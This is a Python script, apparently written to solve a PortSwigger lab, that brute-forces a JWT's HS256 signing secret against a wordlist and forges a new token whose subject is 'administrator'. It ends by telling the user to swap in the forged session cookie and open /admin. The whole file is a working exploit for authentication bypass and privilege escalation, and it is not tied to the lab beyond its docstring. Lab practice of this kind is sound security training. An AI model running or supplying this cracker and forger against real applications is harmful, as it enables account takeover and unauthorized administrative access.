#!/usr/bin/env python3
"""
JWT authentication bypass via weak signing key — crack + forge.

Brute-forces an HS256 JWT's signing secret against a wordlist, then
mints a new token with a chosen `sub` claim signed using the cracked
secret.

Usage:
    python3 jwt_weak_key_solver.py --token "<jwt>" --wordlist jwt-secrets.txt
    python3 jwt_weak_key_solver.py --token "<jwt>" --wordlist jwt-secrets.txt --sub administrator

If --wordlist is omitted, you'll be prompted for a path. This script
does not download a wordlist itself — point it at the lab's secrets
list (PortSwigger links one on the lab page).
"""

import argparse
import sys
import warnings

warnings.filterwarnings("ignore", message="The HMAC key is.*below the minimum recommended length")

try:
    import jwt
except ImportError:
    sys.exit("Missing dependency. Install it with: pip3 install pyjwt --break-system-packages")


def crack_secret(token: str, wordlist_path: str) -> str:
    with open(wordlist_path, encoding="utf-8", errors="ignore") as f:
        candidates = [line.strip() for line in f if line.strip()]

    print(f"Trying {len(candidates)} candidate secrets against the token...")
    for i, secret in enumerate(candidates, 1):
        try:
            jwt.decode(token, secret, algorithms=["HS256"])
            print(f"\n[+] Secret found: {secret!r}  (candidate #{i})")
            return secret
        except jwt.InvalidSignatureError:
            continue
        except jwt.PyJWTError:
            # malformed token for this candidate's decode path; skip
            continue

    sys.exit("[-] No match found in wordlist. Confirm this is the right list for the lab.")


def forge_token(token: str, secret: str, sub: str) -> str:
    # decode without verifying so we keep the original claims/structure,
    # then overwrite sub and re-sign with the cracked secret.
    payload = jwt.decode(token, options={"verify_signature": False})
    payload["sub"] = sub
    header = jwt.get_unverified_header(token)

    forged = jwt.encode(payload, secret, algorithm="HS256", headers={"kid": header.get("kid")} if header.get("kid") else None)
    return forged


def main():
    parser = argparse.ArgumentParser(description="Crack a weak HS256 JWT secret and forge an admin token.")
    parser.add_argument("--token", required=True, help="the captured JWT (session cookie value)")
    parser.add_argument("--wordlist", required=True, help="path to the secrets wordlist")
    parser.add_argument("--sub", default="administrator", help="the sub claim to forge (default: administrator)")
    args = parser.parse_args()

    secret = crack_secret(args.token, args.wordlist)
    forged = forge_token(args.token, secret, args.sub)

    print("\n=== FORGED TOKEN ===")
    print(forged)
    print("\nReplace your session cookie with this value, then browse to /admin")


if __name__ == "__main__":
    main()
